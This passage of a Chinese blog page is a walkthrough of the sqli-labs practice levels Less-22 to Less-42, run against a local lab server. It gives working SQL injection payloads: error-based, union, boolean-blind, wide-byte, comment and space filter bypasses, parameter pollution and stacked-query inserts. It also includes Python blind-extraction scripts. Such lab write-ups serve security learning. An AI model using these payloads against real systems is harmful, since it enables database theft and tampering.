+<li><p><img src="/sqli_labs.assets/image-20231225164557378.png" alt="image-20231225164557378"></p>
+</li>
+</ul>
+<h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><ul>
+<li><p>用yakit抓包，根据页面显示，在cookie后面可进行<strong>报错注入</strong>,并且代码被进行了编码，所以需要将注入的代码进行编码后注入。字符型闭合，闭合符为<code>&quot;</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251647350.png" alt="image-20231225164738350"></p>
+</li>
+<li><pre><code>GET /sqli/Less-22/index.php HTTP/1.1
+Host: 192.168.2.48
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Referer: http://192.168.2.48/sqli/Less-22/index.php
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uname=MCIgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSkgLS0gLQ==
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225164959903](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251650723.png)</span><br><span class="line"></span><br><span class="line"># Less-23</span><br><span class="line"></span><br><span class="line">- 注释符被屏蔽了，字符型闭合，所以当输入**正确的闭合符+注释符**时会报错。闭合符为`&#x27;`。因为会报错，所以使用**报错注入**</span><br><span class="line">- ![image-20231225171126039](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251711248.png)</span><br><span class="line">- `http://192.168.2.48/sqli/Less-23/?id=1&#x27; and (extractvalue(1,concat(0x7e,(select database()),0x7e))) or &#x27;`</span><br><span class="line">- ![image-20231225170539926](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251705214.png)</span><br><span class="line"></span><br><span class="line"># Less-24</span><br><span class="line"></span><br><span class="line">- 通过二次注入修改密码。先注册一个账号`admin&#x27; -- -`，并且登录</span><br><span class="line">- 修改`admin&#x27; -- -`的密码，但是在代码中修改的则是`admin`的密码，以此来修改已用用户名的密码</span><br><span class="line">- 如果修改失败，说明闭合不对。这关的闭合符为`&#x27;`</span><br><span class="line">- ![image-20231225173037591](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251730559.png)</span><br><span class="line"></span><br><span class="line"># Less-25</span><br><span class="line"></span><br><span class="line">- 屏蔽了or和and，无论大小写。因为有报错，所以使用**报错**注入。字符型闭合，闭合符为`&#x27;`</span><br><span class="line">- `http://192.168.2.48/sqli/Less-25/?id=-1&#x27; || (extractvalue(1,concat(0x7e,(select database()),0x7e))) -- -`</span><br><span class="line">- ![image-20231225191920571](sqli_labs.assets/image-20231225191920571.png)</span><br><span class="line"></span><br><span class="line"># Less-25a</span><br><span class="line"></span><br><span class="line">- 屏蔽了or和and，无论大小写。数字型闭合，使用`union select 1,2,3-- -`语句得出有三个字段，可使用**联合查询**。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-25a\?id=-1 union select  1,2,database()-- -`</span><br><span class="line">- ![image-20231225192937551](sqli_labs.assets/image-20231225192937551.png)</span><br><span class="line"></span><br><span class="line"># Less-26</span><br><span class="line"></span><br><span class="line">- 屏蔽了or,and,注释符，空格。字符型闭合，闭合符为`&#x27;`。用括号，其他符号去绕开空格，使用**报错注入**。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-26/?id=1&#x27;||(extractvalue(1,concat(0x7e,(select(database())),0x7e)))||&#x27;1&#x27;=&#x27;1`</span><br><span class="line">- ![image-20231225195101771](sqli_labs.assets/image-20231225195101771.png)</span><br><span class="line"></span><br><span class="line"># Less-26a</span><br><span class="line"></span><br><span class="line">- 屏蔽了or,and,注释符，空格。字符型闭合，闭合符为`&#x27;`。没有报错回显，所以使用**布尔盲注**</span><br><span class="line"></span><br><span class="line">- `http://192.168.2.48/sqli/Less-26a/?id=1&#x27;&amp;&amp;ascii(substring(database(),1,1))=115&amp;&amp;&#x27;`</span><br><span class="line"></span><br><span class="line">- ![image-20231225204139846](https://raw.githubusercontent.com/guangfa29/123/main/img/202312252041001.png)</span><br><span class="line"></span><br><span class="line">- 使用python脚本</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  import requests</span><br><span class="line">  session = requests.Session()</span><br><span class="line">  url = &quot;http://192.168.2.48/sqli/Less-27/?id=0&quot;</span><br><span class="line">  </span><br><span class="line">  def db_2():</span><br><span class="line">      name = &#x27;&#x27;</span><br><span class="line">      for i in range(1, 15):</span><br><span class="line">          start = 32</span><br><span class="line">          end = 127</span><br><span class="line">          mid = (start + end) // 2</span><br><span class="line">          while start &lt;= end:</span><br><span class="line">              # 假设正确的成功条件是URL返回一个特定的字符串</span><br><span class="line">              payload = url + f&quot;&#x27;||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;||&#x27;&quot;</span><br><span class="line">              print(payload)  # 如果你想看实际发送的payload，可以将这行取消注释</span><br><span class="line">              response = session.get(payload)</span><br><span class="line">              if &#x27;Your Login name&#x27; in response.text:</span><br><span class="line">                  start = mid + 1</span><br><span class="line">                  mid = (start + end) // 2</span><br><span class="line">              else:</span><br><span class="line">                  end = mid - 1</span><br><span class="line">                  mid = (start + end) // 2</span><br><span class="line">          if start &gt; 127 or mid == 32:  # 如果start大于ASCII字符的上限，则停止</span><br><span class="line">              break</span><br><span class="line">          name += chr(start)  # 最后找到ASCII字符应该是start或end，因为它们会汇合</span><br><span class="line">          print(name)</span><br><span class="line">  </span><br><span class="line">  db_2()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312252045270.png" alt="image-20231225204535109"></p>
+</li>
+</ul>
+<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><ul>
+<li>屏蔽了空格，注释符。<code>空格=%0a</code> 字符型闭合，闭合符为<code>&#39;</code>，<strong>报错注入</strong></li>
+<li><code>http://192.168.2.48/sqli/Less-27/?id=1&#39; and%0a(extractvalue(1,concat(0x7e,(select database()),0x7e))) or &#39;1&#39;=&#39;1</code></li>
+<li><img src="/sqli_labs.assets/image-20231225211035824.png" alt="image-20231225211035824"></li>
+</ul>
+<h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><ul>
+<li><code>select,union</code>这类关键词只过滤完全大写或者完全小写，针对php这种弱类型语言，可以采用部分大写，部分小写绕过。字符型闭合，闭合符为<code>&quot;</code>。通过<code>uNion sElect 1,2,3</code>查询有三个字段，使用联合查询。</li>
+<li><code>http://192.168.2.48/sqli/Less-27a/?id=0&quot;%0auNion%0asElect%0a1,database(),3%0aor&quot;1&quot;=&quot;1</code></li>
+<li><img src="/sqli_labs.assets/image-20231226143301058.png" alt="image-20231226143301058"></li>
+</ul>
+<h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><ul>
+<li>屏蔽了<code>union select</code>，空格，注释符。字符型闭合，闭合符为<code>&#39;)</code>。没有错误回显，先使用<code>uniounion %0a selectn %0a select 1,2,3</code>发现有三个字段，使用联合查询。</li>
+<li><code>http://192.168.2.48/sqli/Less-28/?id=0&#39;) %0a uniounion %0a selectn%0aselect %0a1,database(),2%0a and (&#39;1&#39;)=(&#39;1</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312261602524.png" alt="image-20231226160252857"></li>
+</ul>
+<h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><ul>
+<li><p>屏蔽了<code>union select</code>，空格，注释符。字符型闭合，闭合符为<code>&#39;)</code>。没有错误回显，使用布尔盲注。</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-28a/?id=1&#39;) and %0aascii(substr(database(),1,1))=115%0a and(&#39;1&#39;)=(&#39;1</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312261616825.png" alt="image-20231226161643527"></p>
+</li>
+<li><p>使用python脚本</p>
+</li>
+<li><pre><code>import requests
+session = requests.Session()
+url = &#39;http://192.168.2.48/sqli/Less-28a/?id=0&#39;
+
+def db_2():
+    name = &#39;&#39;
+    for i in range(1, 15):
+        start = 32
+        end = 127
+        mid = (start + end) // 2
+        while start &lt;= end:
+            # 假设正确的成功条件是URL返回一个特定的字符串
+            payload = url + f&quot;&#39;)||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;||(&#39;&quot;
+            print(payload)  # 如果你想看实际发送的payload，可以将这行取消注释
+            response = session.get(payload)
+            if &#39;Your Login name&#39; in response.text:
+                start = mid + 1
+                mid = (start + end) // 2
+            else:
+                end = mid - 1
+                mid = (start + end) // 2
+        if start &gt; 127 or mid == 32:  # 如果start大于ASCII字符的上限，则停止
+            break
+        name += chr(start)  # 最后找到ASCII字符应该是start或end，因为它们会汇合
+        print(name)
+
+db_2()
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231226161732306](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261617332.png)</span><br><span class="line"></span><br><span class="line"># Less-29</span><br><span class="line"></span><br><span class="line">- http参数污染。`?id=1&amp;&amp;id=2`在不同情况下有不同取法。</span><br><span class="line">- ![image.png](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261645550.png)</span><br><span class="line"></span><br><span class="line">- 字符型闭合，闭合符为`&#x27;`，直接使用联合查询即可。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-29/?id=1&amp;&amp;id=0&#x27; union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- - `</span><br><span class="line">- ![image-20231226164620704](sqli_labs.assets/image-20231226164620704.png)</span><br><span class="line"></span><br><span class="line"># Less-30</span><br><span class="line"></span><br><span class="line">- http参数污染，字符型闭合，闭合符为`&quot;`，联合查询。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-30/?id=1&amp;&amp;id=0&quot;  union select 1,2,database()-- -`</span><br><span class="line">- ![image-20231226165136437](sqli_labs.assets/image-20231226165136437.png)</span><br><span class="line"></span><br><span class="line"># Less-31</span><br><span class="line"></span><br><span class="line">- http参数污染，字符型闭合，闭合符为`&quot;)`，联合查询。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-31/?id=1&amp;&amp;id=0&quot;) union select 1,2,database()-- -·`</span><br><span class="line">- ![image-20231226165426563](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261654428.png)</span><br><span class="line"></span><br><span class="line"># Less-32</span><br><span class="line"></span><br><span class="line">- 宽字节注入，字符型闭合，闭合符为`&#x27;`。在闭合符前面加上`%df`。直接联合注入。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-32/?id=0%df&#x27; union select 1,2,database() -- -`</span><br><span class="line">- ![image-20231226193339732](sqli_labs.assets/image-20231226193339732.png)</span><br><span class="line"></span><br><span class="line"># Less-33</span><br><span class="line"></span><br><span class="line">- 宽字节注入，字符型闭合，闭合符为`&#x27;`。`&#x27;1&#x27;=&#x27;2&#x27;`有报错显示，使用**报错注入**。</span><br><span class="line">- `http://192.168.2.48/sqli/Less-33/?id=1%df&#x27; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -`</span><br><span class="line">- ![image-20231226193748085](sqli_labs.assets/image-20231226193748085.png)</span><br><span class="line"></span><br><span class="line"># Less-34</span><br><span class="line"></span><br><span class="line">- POST型宽字节注入，字符型闭合，闭合符为`&#x27;`。用yakit抓包，报错回显是张图片，直接联合查询`union select 1,2`</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  POST /sqli/Less-34/ HTTP/1.1</span><br><span class="line">  Host: 192.168.2.48</span><br><span class="line">  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">  Referer: http://192.168.2.48/sqli/Less-34/</span><br><span class="line">  Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">  Cache-Control: max-age=0</span><br><span class="line">  Upgrade-Insecure-Requests: 1</span><br><span class="line">  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">  Accept-Encoding: gzip, deflate</span><br><span class="line">  Content-Type: application/x-www-form-urlencoded</span><br><span class="line">  Origin: http://192.168.2.48</span><br><span class="line">  Content-Length: 40</span><br><span class="line">  </span><br><span class="line">  uname=admin1%df&#x27; union select 1,2-- -&amp;passwd=admin1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="/sqli_labs.assets/image-20231226202049443.png" alt="image-20231226202049443"></p>
+</li>
+<li><p>post方式下会对所有能编码的字符串全部编码，将<code>%</code>编码成<code>%25</code>，所以需要提前将<code>%df</code>解码，再输入进去。</p>
+</li>
+<li><p><code>0�&#39; union select 1,database()-- -</code></p>
+</li>
+<li><p><img src="/sqli_labs.assets/image-20231226202735244.png" alt="image-20231226202735244"></p>
+</li>
+</ul>
+<h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><ul>
+<li><p>宽字节注入，数字型闭合。直接使用联合查询，但是在查询列名的时候，需要将查询的数据表名转换为十六进制,然后在前面加上<code>0x</code>。如：</p>
+<p><code>users--&gt;7573657273, table_name=0x7573657273</code></p>
+</li>
+<li><pre><code>http://192.168.2.48/sqli/Less-35/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273-- -
+</code></pre>
+</li>
+<li><p><img src="/sqli_labs.assets/image-20231226205631076.png" alt="image-20231226205631076"></p>
+</li>
+</ul>
+<h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><ul>
+<li>宽字节注入，字符型闭合，闭合符为<code>&#39;</code>。直接使用联合查询。</li>
+<li><code>http://192.168.2.48/sqli/Less-36/?id=0%df&#39; union select 1,2,database()-- -</code></li>
+<li><img src="/sqli_labs.assets/image-20231226210358922.png" alt="image-20231226210358922"></li>
+</ul>
+<h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><ul>
+<li>POST型宽字节注入，字符型闭合，闭合符为<code>&#39;</code>。</li>
+<li><code>0�&#39; union select 1,database()</code></li>
+<li><img src="/sqli_labs.assets/image-20231226210832615.png" alt="image-20231226210832615"></li>
+</ul>
+<h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><ul>
+<li><p>堆叠注入。<code> mysqli_multi_query($con1, $sql) //支持多条sql语句同时执行，由；分隔，成堆的执行sql语句</code>。字符型闭合，符合符为<code>&#39;</code>。</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-38/?id=1&#39; ;INSERT INTO users(id,username,password) VALUES (20,20,20)-- -</code></p>
+<p>以此向users表注入一行数据。</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312262120054.png" alt="image-20231226212033315"></p>
+</li>
+</ul>
+<h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><ul>
+<li>堆叠注入，数字型闭合。</li>
+<li><code>http://192.168.2.48/sqli/Less-39/?id=1 ;INSERT INTO users(id,username,password) VALUES (30,30,30)-- -</code></li>
+<li><img src="/sqli_labs.assets/image-20231226212453677.png" alt="image-20231226212453677"></li>
+</ul>
+<h1 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><ul>
+<li>堆叠注入，字符型闭合，闭合符为<code>&#39;)</code>。</li>
+<li><code>http://192.168.2.48/sqli/Less-40/?id=1&#39;)  ;INSERT INTO users(id,username,password) VALUES (40,40,40)-- -</code></li>
+<li><img src="/sqli_labs.assets/image-20231226212831317.png" alt="image-20231226212831317"></li>
+</ul>
+<h2 id="new-user-php"><a href="#new-user-php" class="headerlink" title="new_user.php"></a>new_user.php</h2><p>跳转Less-24</p>
+<h1 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h1><ul>
+<li>堆叠注入，数字型闭合。</li>
+<li><code>http://192.168.2.64/sqli/Less-41/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;;INSERT INTO users(id,username,password) VALUES (50,50,50)-- -</code></li>
+<li><img src="/sqli_labs.assets/image-20231227103408354.png" alt="image-20231227103408354"></li>
+</ul>
+<h1 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h1><ul>
+<li>POST型宽字节注入+堆叠注入，字符型闭合，闭合符为<code>&#39;</code>。</li>
+</ul>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            John Doe
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/17/vue/">vue导入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/17/phpstudy_mysql/">phpstudy的mysql服务开启</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/17/php_study/">php的一些基础知识</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/python_study1/">python_study</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/04/linux_stduy/">Linux的学习</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/03/daboke/">利用github搭博客</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/03/tuchuang/">图床搭建</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/17/php_study/">php的一些基础知识</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/17/vue/">vue导入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2023/12/25/sqli_labs/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2023/12/25/sqli_labs/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2023/12/25/sqli_labs/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/ZEROKISEKI/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 John Doe Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
